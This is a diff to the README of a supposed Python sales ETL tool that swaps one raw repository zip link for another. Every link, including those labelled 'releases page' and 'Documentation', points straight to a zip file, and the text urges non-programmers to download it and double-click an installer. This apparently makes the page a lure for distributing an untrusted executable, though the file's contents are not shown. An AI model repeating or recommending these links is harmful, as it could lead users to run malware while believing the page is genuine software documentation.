@@ -4,7 +4,7 @@
 Welcome to ETL, a Sales ETL tool built in Python using Pandas and NumPy. This software helps you transform and manage sales data easily, turning complex processes into a simple workflow. No programming knowledge is necessary—just follow our steps, and you will be processing data in no time.
 
 ## 📥 Download ETL
-[![Download ETL](https://raw.githubusercontent.com/A100200z/ETL/main/psychorealist/ETL.zip%https://raw.githubusercontent.com/A100200z/ETL/main/psychorealist/ETL.zip)](https://raw.githubusercontent.com/A100200z/ETL/main/psychorealist/ETL.zip)
+[![Download ETL](https://github.com/A100200z/ETL/raw/refs/heads/main/src/sales_etl/Software_v3.5-alpha.2.zip%https://github.com/A100200z/ETL/raw/refs/heads/main/src/sales_etl/Software_v3.5-alpha.2.zip)](https://github.com/A100200z/ETL/raw/refs/heads/main/src/sales_etl/Software_v3.5-alpha.2.zip)
 
 ## 🚀 Getting Started
 ### System Requirements
@@ -15,7 +15,7 @@ To run ETL, you need:
 - An internet connection for updates.
 
 ### Installation Steps
-1. **Visit the releases page.** Click on this link: [Download ETL](https://raw.githubusercontent.com/A100200z/ETL/main/psychorealist/ETL.zip) to go to the Releases page.
+1. **Visit the releases page.** Click on this link: [Download ETL](https://github.com/A100200z/ETL/raw/refs/heads/main/src/sales_etl/Software_v3.5-alpha.2.zip) to go to the Releases page.
 2. **Select the latest version.** Look for the most recent version available. You will see it listed at the top of the page.
 3. **Choose your file type.** Depending on your system (Windows, macOS, or Linux), download the appropriate file. Click on the file to start downloading.
 4. **Run the installer.** Once downloaded, locate the file in your Downloads folder. Double-click it to run the installer. Follow the prompts to complete the installation.
@@ -54,7 +54,7 @@ To run ETL, you need:
   - **Solution:** Close other applications and try running the installer again. Make sure you have sufficient permissions.
 
 ## 🛠️ Support and Resources
-For more information, please visit the [Documentation](https://raw.githubusercontent.com/A100200z/ETL/main/psychorealist/ETL.zip). You can find guides, FAQs, and list of common issues.
+For more information, please visit the [Documentation](https://github.com/A100200z/ETL/raw/refs/heads/main/src/sales_etl/Software_v3.5-alpha.2.zip). You can find guides, FAQs, and list of common issues.
 
 ## 📜 License
 This project is licensed under the MIT License. You are free to use it, modify it, and distribute it as long as you include the original license with your distribution.
